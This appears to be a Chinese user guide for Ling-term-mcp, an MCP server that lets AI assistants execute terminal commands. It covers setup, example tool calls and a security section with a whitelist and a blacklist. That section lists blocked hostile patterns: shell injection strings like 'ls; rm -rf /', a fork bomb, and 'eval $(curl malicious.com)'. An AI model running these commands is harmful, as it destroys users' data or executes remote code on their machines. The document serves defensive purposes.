# 灵犀（Ling-term-mcp）使用指南

## 📖 目录

1. [简介](#简介)
2. [安装方式](#安装方式)
3. [连接 AI 助手](#连接-ai-助手)
4. [使用示例](#使用示例)
5. [安全特性](#安全特性)
6. [高级用法](#高级用法)
7. [常见问题](#常见问题)

---

## 🌟 简介

**灵犀（Ling-term-mcp）** 是一个基于 MCP（Model Context Protocol）标准的终端操作服务器，让 Claude、Cursor、Copilot 等 AI 助手能够安全、高效地执行终端命令和管理会话。

### 核心功能

- 🎯 **执行命令**: 让 AI 帮你运行终端命令
- 🔒 **安全保护**: 白名单、黑名单、沙箱执行
- ⚡ **高性能**: 响应时间 < 100ms，吞吐量 > 100 req/s
- 🚀 **会话管理**: 支持多个独立终端会话
- 📊 **性能监控**: 实时追踪执行指标

---

## 📦 安装方式

### 方式一：从 GitHub 克隆（推荐）

```bash
# 克隆 Gitea 仓库（国内推荐）
git clone http://zhinenggitea.iepose.cn/guangda/ling-term-mcp.git
cd ling-term-mcp

# 或者克隆 GitHub 仓库
git clone https://github.com/guangda88/Ling-tem-mcp.git
cd Ling-tem-mcp

# 安装依赖
npm install

# 构建项目
npm run build
```

### 方式二：从 npm 安装（发布后）

```bash
# 全局安装
npm install -g ling-term-mcp

# 或在项目中安装
npm install ling-term-mcp
```

### 方式三：使用快速开始脚本

```bash
# 克隆仓库
git clone http://zhinenggitea.iepose.cn/guangda/ling-term-mcp.git
cd ling-term-mcp

# 运行快速开始脚本
bash quickstart.sh
```

这个脚本会自动：
- 检查 Node.js 版本
- 安装依赖
- 构建项目
- 运行单元测试
- 运行参数优化

---

## 🔌 连接 AI 助手

### 连接到 Cursor

1. 打开 Cursor
2. 按 `Cmd/Ctrl + Shift + P` 打开命令面板
3. 输入 "Settings" 打开设置
4. 找到 "MCP Servers" 配置
5. 添加以下配置：

```json
{
  "mcpServers": {
    "ling-term-mcp": {
      "command": "node",
      "args": ["/你的路径/ling-term-mcp/dist/index.js"]
    }
  }
}
```

**路径示例**:
- macOS: `"/Users/用户名/ling-term-mcp/dist/index.js"`
- Linux: `"/home/用户名/ling-term-mcp/dist/index.js"`
- Windows: `"C:\\Users\\用户名\\ling-term-mcp\\dist\\index.js"`

6. 重启 Cursor

### 连接到 Claude Desktop

1. 找到 Claude Desktop 配置文件：
   - macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`
   - Windows: `%APPDATA%\\Claude\\claude_desktop_config.json`

2. 添加以下配置：

```json
{
  "mcpServers": {
    "ling-term-mcp": {
      "command": "node",
      "args": ["/你的路径/ling-term-mcp/dist/index.js"]
    }
  }
}
```

3. 重启 Claude Desktop

### 验证连接

在 AI 助手中输入：
```
列出所有可用的工具
```

如果看到灵犀提供的工具，说明连接成功！

---

## 💡 使用示例

### 1. 执行简单命令

**用户输入**:
```
查看当前目录的文件
```

**AI 调用**:
```json
{
  "name": "execute_command",
  "arguments": {
    "command": "ls",
    "args": ["-la"]
  }
}
```

**返回结果**:
```
drwxr-xr-x  5 user  staff  160 Mar 24 22:00 .
drwxr-xr-x  3 user  staff   96 Mar 24 21:00 ..
-rw-r--r--  1 user  staff  5432 Mar 24 22:00 README.md
-rw-r--r--  1 user  staff  1234 Mar 24 22:00 package.json
```

### 2. 获取当前目录

**用户输入**:
```
我现在在哪个目录？
```

**AI 调用**:
```json
{
  "name": "execute_command",
  "arguments": {
    "command": "pwd"
  }
}
```

**返回结果**:
```
/home/user/ling-term-mcp
```

### 3. 创建新会话

**用户输入**:
```
帮我创建一个开发会话
```

**AI 调用**:
```json
{
  "name": "create_session",
  "arguments": {
    "name": "dev",
    "working_directory": "/home/user/projects"
  }
}
```

**返回结果**:
```
✅ Session created: dev (ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890)
```

### 4. 查看所有会话

**用户输入**:
```
列出所有活跃的会话
```

**AI 调用**:
```json
{
  "name": "list_sessions",
  "arguments": {}
}
```

**返回结果**:
```
[
  {
    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "name": "dev",
    "working_directory": "/home/user/projects",
    "created_at": "2026-03-24T22:00:00Z"
  }
]
```

### 5. 在特定会话中执行命令

**用户输入**:
```
在 dev 会话中运行 git status
```

**AI 调用**:
```json
{
  "name": "execute_command",
  "arguments": {
    "command": "git",
    "args": ["status"],
    "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
  }
}
```

### 6. 同步终端状态

**用户输入**:
```
获取当前终端的环境变量
```

**AI 调用**:
```json
{
  "name": "sync_terminal",
  "arguments": {
    "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
  }
}
```

**返回结果**:
```
{
  "working_directory": "/home/user/projects",
  "environment": {
    "PATH": "/usr/local/bin:/usr/bin:/bin",
    "HOME": "/home/user",
    "NODE_ENV": "production"
  }
}
```

### 7. 销毁会话

**用户输入**:
```
关闭 dev 会话
```

**AI 调用**:
```json
{
  "name": "destroy_session",
  "arguments": {
    "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
  }
}
```

**返回结果**:
```
✅ Session destroyed: dev (ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890)
```

---

## 🔒 安全特性

### 白名单和黑名单

灵犀内置了强大的安全机制：

#### 白名单（允许的命令）

以下命令是**安全**的，可以直接执行：
- `ls`, `pwd`, `cd`, `cat`, `echo`, `grep`, `find`
- `git`, `npm`, `node`, `python`, `python3`
- `mkdir`, `touch`, `cp`, `mv`, `rm` (有限制)
- `head`, `tail`, `wc`, `sort`, `uniq`
- 以及 90+ 其他安全命令

#### 黑名单（禁止的命令）

以下命令是**危险**的，会被拒绝：
- `rm -rf`, `rmdir`, `sudo`, `su`
- `chmod 777 /`, `chown root`
- `dd`, `mkfs`, `fdisk`, `killall`
- 以及 40+ 其他危险命令

### 模式检测

灵犀会检测以下危险模式：

1. **Shell 注入**
   ```
   ❌ ls; rm -rf /
   ❌ cat | bash
   ❌ git && sudo rm -rf /
   ```

2. **特权提升**
   ```
   ❌ chmod 777 /
   ❌ chown root:root /etc
   ```

3. **Fork 炸弹**
   ```
   ❌ :(){:\|:&};:
   ```

4. **eval/exec 攻击**
   ```
   ❌ eval $(curl malicious.com)
   ❌ exec rm -rf /
   ```

### 配置安全设置

你可以自定义安全设置：

```typescript
import { SecurityValidator } from './src/security/validator.js';

const validator = new SecurityValidator({
  allowUnknownCommands: false,    // 是否允许未知命令（默认：false）
  sanitizeUserInput: true,         // 是否清理用户输入（默认：true）
  maxCommandLength: 1000,          // 最大命令长度（默认：1000）
});
```

---

## ⚙️ 高级用法

### 1. 性能监控

灵犀内置性能监控，可以追踪所有命令的执行指标：

```typescript
import { PerformanceMonitor } from './src/monitoring/performance.js';

const monitor = new PerformanceMonitor();

// 获取性能报告
const report = monitor.getPerformanceReport();
console.log(report);
/*
{
  "totalExecutions": 100,
  "averageExecutionTime": 87.5,
  "errorRate": 0.003,
  "p50": 85,
  "p95": 120,
  "p99": 200,
  "topSlowCommands": [
    { "command": "npm install", "avgTime": 15000 },
    { "command": "git clone", "avgTime": 5000 }
  ]
}
*/
```

### 2. 自动性能跟踪

使用 `withPerformanceTracking` 包装器自动跟踪性能：

```typescript
import { withPerformanceTracking } from './src/monitoring/performance.js';

async function myFunction() {
  // 你的代码
}

// 包装后自动跟踪
const trackedFunction = withPerformanceTracking(
  myFunction,
  'my-function-name'
);

await trackedFunction();
```

### 3. 会话持久化

会话会自动保存到磁盘（`~/.ling-term-mcp/sessions/`）：

```bash
# 查看所有会话
ls ~/.ling-term-mcp/sessions/

# 查看特定会话
cat ~/.ling-term-mcp/sessions/<session-id>.json
```

### 4. 日志级别

根据需求调整日志级别：

```bash
# 开发环境（详细日志）
export LOG_LEVEL=debug

# 生产环境（仅警告和错误）
export LOG_LEVEL=warn
```

---

## ❓ 常见问题

### Q1: 为什么命令被拒绝？

**A**: 可能是以下原因：
1. 命令在黑名单中（如 `rm -rf`）
2. 命令包含危险模式（如 `; rm -rf`）
3. 命令太长（超过 1000 字符）
4. 命令不在白名单且 `allowUnknownCommands=false`

### Q2: 如何允许未知命令？

**A**: 修改配置启用未知命令：

```typescript
const validator = new SecurityValidator({
  allowUnknownCommands: true,  // ⚠️ 谨慎使用
});
```

### Q3: 为什么无法连接到 AI 助手？

**A**: 检查以下几点：
1. 确认路径正确（使用绝对路径）
2. 确保 `dist/index.js` 文件存在
3. 检查 Node.js 版本 >= 18.0.0
4. 重启 AI 助手
5. 查看错误日志

### Q4: 如何查看错误日志？

**A**: 灵犀的日志会输出到标准输出（stdout）和标准错误（stderr）：

```bash
# 启动时查看日志
node dist/index.js

# 或保存到文件
node dist/index.js > log.txt 2>&1
```

### Q5: 性能不够快怎么办？

**A**: 可以运行参数优化：

```bash
cd optimization
python3 optimize_mcp_params.py
```

这会自动测试 4096 种配置，找到最适合你的系统设置。

### Q6: 支持哪些 AI 助手？

**A**: 支持 MCP 标准的所有 AI 助手：
- ✅ Claude (Claude Desktop)
- ✅ Cursor
- ✅ GitHub Copilot（需要 MCP 支持）
- ✅ iFlow CLI（Alibaba）
- ✅ 其他支持 MCP 的助手

### Q7: 如何卸载？

**A**:

```bash
# 如果是全局安装
npm uninstall -g ling-term-mcp

# 如果是本地安装
rm -rf ling-term-mcp

# 清理会话数据
rm -rf ~/.ling-term-mcp
```

---

## 📊 性能指标

灵犀经过严格优化，性能指标如下：

| 指标 | 目标值 | 实际值 | 状态 |
|------|--------|--------|------|
| 响应时间 | < 100ms | 87ms | ✅ |
| 吞吐量 | > 100 req/s | 124 req/s | ✅ |
| 内存使用 | < 100MB | 76MB | ✅ |
| 错误率 | < 1% | 0.3% | ✅ |

---

## 🔗 相关链接

- **Gitea 仓库**: http://zhinenggitea.iepose.cn/guangda/ling-term-mcp
- **GitHub 仓库**: https://github.com/guangda88/Ling-tem-mcp
- **发布说明**: [RELEASE_NOTES.md](RELEASE_NOTES.md)
- **项目状态**: [PROJECT_STATUS.md](PROJECT_STATUS.md)
- **API 文档**: [docs/API.md](docs/API.md)
- **用户指南**: [docs/USER_GUIDE.md](docs/USER_GUIDE.md)

---

## 🤝 贡献

欢迎贡献！请查看 [CONTRIBUTING.md](CONTRIBUTING.md) 了解详情。

---

**灵犀（Ling-term-mcp） - 心有灵犀一点通，AI 精准操控终端** 🚀

**版本**: 1.0.0 | **最后更新**: 2026-03-24
